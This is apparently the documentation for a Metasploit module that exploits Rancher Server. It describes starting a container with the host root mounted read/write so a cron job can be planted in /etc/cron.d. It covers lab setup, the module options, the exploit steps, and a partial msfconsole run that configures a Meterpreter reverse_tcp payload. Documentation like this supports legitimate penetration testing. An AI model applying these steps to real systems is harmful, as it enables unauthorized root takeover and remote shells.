# Vulnerable Application
Utilizing Rancher Server, an attacker can create a docker container
with the '/' path mounted with read/write permissions on the host
server that is running the docker container. As the docker container
executes command as uid 0 it is honored by the host operating system
allowing the attacker to edit/create files owed by root. This exploit
abuses this to creates a cron job in the '/etc/cron.d/' path of the
host server.

The Docker image should exist on the target system or be a valid image
from hub.docker.com.

## Rancher setup
Rancher is deployed as a set of Docker containers. Running Rancher is
as simple as launching two containers. One container as the management
server and another container on a node as an agent.

This module was tested with Debian 9 and CentOS 7 as the host operating
system with Docker 17.06.1-ce and Rancher Server 1.6.2, all with
default installation.

### Install Debian 9
First [install Debian 9][1] with default task selection. This includes
the "*standard system utilities*".

### Install Docker CE
Then install a supported version of [Docker on Debian system][2].

```bash
# TL;DR
apt-get remove docker docker-engine
apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common
curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -
apt-key fingerprint 0EBFCD88
# Verify that the key ID is 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88.
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable"
apt-get update
apt-get install docker-ce
docker run hello-world
```

### Rancher Server (Management)
I recommend doing a ['Rancher Server - Single Container (NON-HA)'
installation][3].

If Docker is installed, the command to start a single instance of
Rancher is simple.

```bash
# TL;DR
sudo docker run -d --restart=unless-stopped -p 8080:8080 rancher/server
```

If all is passing navigate to `http://[ip]:8080/`. You should see the
Rancher Server UI web application.

### Rancher Host (Agent)

Add a [new host][4] to Rancher Server so that the Docker host can be managed.

**Set Host Registration URL**

The first time that you add a host, you may be required to set up the
Host Registration URL.

* Navigate to Admin / Settings (`http://[ip]:8080/admin/settings`)
* Check if `"http://[ip]:8080/"` is set 
* Click on Save.

**Add new host**

* Navigate to Infrastructure / Hosts (`http://[ip]:8080/env/1a5/infra/hosts`)
* Click on Add Host
* Copy the command from Point 5 (and remove sudo prefix)
  `docker run --rm --privileged -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/rancher:/var/lib/rancher rancher/agent:v1.2.2 http://[ip]:8080/v1/scripts/XXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXX`
* Paste and run the command on the host

The new host should pop up on the Hosts screen within a minute.

# Exploitation
This module is designed for the attacker to leverage, creation of a
docker container to gain root access on the rancher host.

## Options
- CONTAINER_ID if you want to have a human readable name for your container, else it will be randomly generated
- DOCKERIMAGE is the locally or from hub.docker.com available image you are wanting to have Rancher to deploy for this exploit.
- TARGETURI this is the Rancher Server API path. The default environment is /v1/projects/1a5
- WAIT_TIMEOUT is how long you will wait for a docker container to deploy before bailing out if it does not start.

By default access control is disabled, but if enabled, you need API
Keys with at least "restrictive" permission in the environment.
See Rancher docs for [api-keys][5] and [membership-roles][6].

- HttpUsername is for your Access Key
- HttpPassword is for your Secret Key

## Steps to exploit with module
- [ ] Start msfconsole
- [ ] use exploit/linux/http/rancher_server
- [ ] Set the options appropriately and set VERBOSE to true
- [ ] Verify it creates a docker container and it successfully runs 
- [ ] After a minute a session should be opened from the agent server

## Example Output
```
msf > use exploit/linux/http/rancher_server
msf exploit(rancher_server) > set RHOST 192.168.91.111
RHOST => 192.168.91.111
msf exploit(rancher_server) > set PAYLOAD python/meterpreter/reverse_tcp
PAYLOAD => python/meterpreter/reverse_tcp

LHOST => 192.168.91.1
